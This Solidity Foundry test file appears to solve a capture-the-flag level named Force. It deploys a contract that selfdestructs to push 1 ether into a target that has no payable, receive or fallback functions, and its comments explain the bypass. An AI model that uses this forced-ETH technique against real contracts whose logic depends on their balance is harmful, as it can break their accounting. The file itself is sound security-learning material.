// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Force.sol";
import {Test} from "../lib/forge-std/src/Test.sol";

contract ForceAttack {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract ForceTest is Test {
    /*
     * Even if a contract:
     * 1. has no payable functions
     * 2. has no receive()
     * 3. has no fallback()
     * 4. actively tries to reject ETH
     *
     * It can still receive ETH via:
     * 1. selfdestruct(address)
     * 2. miner bribes
     * 3. precompiles
     * 4. forced balance via state transitions
     *
     *
     *  selfdestruct(target):
     * 1. deletes the sending contract
     * 2. sends all ETH directly to target
     * 3. bypasses payable checks
     * 4. bypasses fallback / receive
     * 5. cannot be reverted by target
     */
    Force public forceTest;

    function setUp() public {
        forceTest = new Force();
    }
    /*
    * selfdestruct(target):
    * 1. deletes the sending contract
    * 2. sends all ETH directly to target
    * 3. bypasses payable checks
    * 4. bypasses fallback / receive
    * 5. cannot be reverted by target
    */
    function testForceAttack() public {
        // sanity check
        assertEq(address(forceTest).balance, 0);

        // deploy attack contract with ETH → sends ETH on selfdestruct
        new ForceAttack{value: 1 ether}(payable(address(forceTest)));

        // Force now has ETH even without receive/fallback
        assertEq(address(forceTest).balance, 1 ether);
    }
}